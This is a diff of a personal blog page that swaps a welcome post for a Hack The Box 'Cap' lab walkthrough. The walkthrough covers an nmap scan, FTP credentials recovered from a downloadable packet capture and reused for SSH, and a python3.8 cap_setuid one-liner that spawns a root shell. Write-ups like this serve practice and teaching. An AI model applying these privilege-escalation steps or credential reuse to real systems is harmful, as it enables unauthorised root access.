@@ -9,8 +9,8 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>New Blog Who Dis - Alex Loney</title>
-<meta name="description" content="I’d like to welcome you to my blog!!">
+<!-- begin _includes/seo.html --><title>HTB: Cap Walkthrough - Alex Loney</title>
+<meta name="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
 
 
   <meta name="author" content="Alex Loney">
@@ -22,26 +22,26 @@
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="Alex Loney">
-<meta property="og:title" content="New Blog Who Dis">
-<meta property="og:url" content="http://localhost:4000/blog/new-blog-who-dis/">
+<meta property="og:title" content="HTB: Cap Walkthrough">
+<meta property="og:url" content="http://localhost:4000/blog/walkthrough/htb/htb-cap/">
 
 
-  <meta property="og:description" content="I’d like to welcome you to my blog!!">
-
-
-
-
-
-
-
-  <meta property="article:published_time" content="2021-06-07T15:15:00-07:00">
+  <meta property="og:description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
 
 
 
 
 
 
-<link rel="canonical" href="http://localhost:4000/blog/new-blog-who-dis/">
+
+  <meta property="article:published_time" content="2021-06-07T15:42:00-07:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/blog/walkthrough/htb/htb-cap/">
 
 
 
@@ -273,15 +273,15 @@
 
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
-    <meta itemprop="headline" content="New Blog Who Dis">
-    <meta itemprop="description" content="I’d like to welcome you to my blog!!">
-    <meta itemprop="datePublished" content="2021-06-07T15:15:00-07:00">
+    <meta itemprop="headline" content="HTB: Cap Walkthrough">
+    <meta itemprop="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+    <meta itemprop="datePublished" content="2021-06-07T15:42:00-07:00">
     
 
     <div class="page__inner-wrap">
       
         <header>
-          <h1 id="page-title" class="page__title" itemprop="headline">New Blog Who Dis
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB: Cap Walkthrough
 </h1>
           
 
@@ -297,7 +297,7 @@
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          less than 1 minute read
+          1 minute read
         
       </span>
     
@@ -309,11 +309,51 @@
 
       <section class="page__content" itemprop="text">
         
-        <p>I’d like to welcome you to my blog!!</p>
+        <p>There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</p>
 
-<p>This blog is going to serve as my online researce for sharing InfoSec related topics, cooking, tech tips, and various other related material!</p>
+<hr />
 
-<p>Stay tuned for more post coming soon!</p>
+<h1 id="enumeration">Enumeration</h1>
+
+<p>I began searching this box with a standard <code class="language-plaintext highlighter-rouge">nmap</code> scan:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo nmap -sC -sV -oA nmap/cap 10.129.121.64
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 21:26 EDT
+Nmap scan report for 10.129.121.64
+Host is up (0.091s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    gunicorn
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 135.21 seconds
+</code></pre></div></div>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>From the above scan, there are ports <code class="language-plaintext highlighter-rouge">21</code>, <code class="language-plaintext highlighter-rouge">22</code>, and <code class="language-plaintext highlighter-rouge">80</code> open, with port <code class="language-plaintext highlighter-rouge">80</code> hosting an HTTP server. Visiting port 80 in a web browser has a web UI which shows various statistics about the web server, including allowing you to download the last 5 minutes of network traffic.</p>
+
+<p>Looking at the download from this, it can be seen that the download starts at index 1, simply adjusting the download back by an index will give you a PCAP dump at index 0. When viewing this PCAP dump, it may be seen that it’s a recording of an FTP connection with the credentials <code class="language-plaintext highlighter-rouge">nathan:Buck3tH4TF0RM3!</code>.</p>
+
+<p>Those credentials work to log into the FTP server on the machine, which starts in the nome directory for <code class="language-plaintext highlighter-rouge">nathan</code>. If you attempt the same FTP credentials via SSH, you’ll see that the <code class="language-plaintext highlighter-rouge">nathan</code> user has the exact same username/password.</p>
+
+<h1 id="privesc">Privesc</h1>
+
+<p>Once logged into SSH, the privesc portion took me a bit, but you can eventually find that the executable <code class="language-plaintext highlighter-rouge">/usr/bin/python3.8</code> has the <code class="language-plaintext highlighter-rouge">cap_setuid</code> capabilities!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>getcap <span class="nt">-r</span> / 2&gt;/dev/null
+/usr/bin/python3.8 <span class="o">=</span> cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping <span class="o">=</span> cap_net_raw+ep
+/usr/bin/traceroute6.iputils <span class="o">=</span> cap_net_raw+ep
+/usr/bin/mtr-packet <span class="o">=</span> cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span class="o">=</span> cap_net_bind_service,cap_net_admin+ep
+</code></pre></div></div>
+
+<p>What this means is that the <code class="language-plaintext highlighter-rouge">python3.8</code> executable has the ability to set the UID of the process, allowing it to run as a different user. You may read more about <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/">Linux Privilege Escalation using Capabilities</a>.</p>
+
+<p>Using the command <code class="language-plaintext highlighter-rouge">/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code> will instantly spawn a root shell.</p>
 
         
       </section>
@@ -330,7 +370,11 @@
     <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
     <span itemprop="keywords">
     
-      <a href="/tags/#update" class="page__taxonomy-item" rel="tag">update</a>
+      <a href="/tags/#htb" class="page__taxonomy-item" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/tags/#htb-easy" class="page__taxonomy-item" rel="tag">htb easy</a><span class="sep">, </span>
+    
+      <a href="/tags/#offsec" class="page__taxonomy-item" rel="tag">offsec</a>
     
     </span>
   </p>
@@ -347,7 +391,11 @@
     <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
     <span itemprop="keywords">
     
-      <a href="/categories/#blog" class="page__taxonomy-item" rel="tag">blog</a>
+      <a href="/categories/#blog" class="page__taxonomy-item" rel="tag">blog</a><span class="sep">, </span>
+    
+      <a href="/categories/#htb" class="page__taxonomy-item" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/categories/#walkthrough" class="page__taxonomy-item" rel="tag">walkthrough</a>
     
     </span>
   </p>
@@ -355,7 +403,7 @@
 
         
 
-  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-06-07T15:15:00-07:00">June 7, 2021</time></p>
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-06-07T15:42:00-07:00">June 7, 2021</time></p>
 
 
       </footer>
@@ -363,22 +411,22 @@
       <section class="page__share">
   
 
-  <a href="https://twitter.com/intent/tweet?text=New+Blog+Who+Dis%20http%3A%2F%2Flocalhost%3A4000%2Fblog%2Fnew-blog-who-dis%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?text=HTB%3A+Cap+Walkthrough%20http%3A%2F%2Flocalhost%3A4000%2Fblog%2Fwalkthrough%2Fhtb%2Fhtb-cap%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fblog%2Fnew-blog-who-dis%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fblog%2Fwalkthrough%2Fhtb%2Fhtb-cap%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fblog%2Fnew-blog-who-dis%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fblog%2Fwalkthrough%2Fhtb%2Fhtb-cap%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
       
   <nav class="pagination">
     
-      <a href="#" class="pagination--pager disabled">Previous</a>
+      <a href="/blog/new-blog-who-dis/" class="pagination--pager" title="New Blog Who Dis
+">Previous</a>
     
     
-      <a href="/blog/walkthrough/htb/htb-cap/" class="pagination--pager" title="HTB: Cap Walkthrough
-">Next</a>
+      <a href="#" class="pagination--pager disabled">Next</a>
     
   </nav>
 
@@ -402,7 +450,7 @@
     
     <h2 class="archive__item-title no_toc" itemprop="headline">
       
-        <a href="/blog/walkthrough/htb/htb-cap/" rel="permalink">HTB: Cap Walkthrough
+        <a href="/blog/new-blog-who-dis/" rel="permalink">New Blog Who Dis
 </a>
       
     </h2>
@@ -420,14 +468,14 @@
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          1 minute read
+          less than 1 minute read
         
       </span>
     
   </p>
 
 
-    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+    <p class="archive__item-excerpt" itemprop="description">I’d like to welcome you to my blog!!
 
 </p>
   </article>
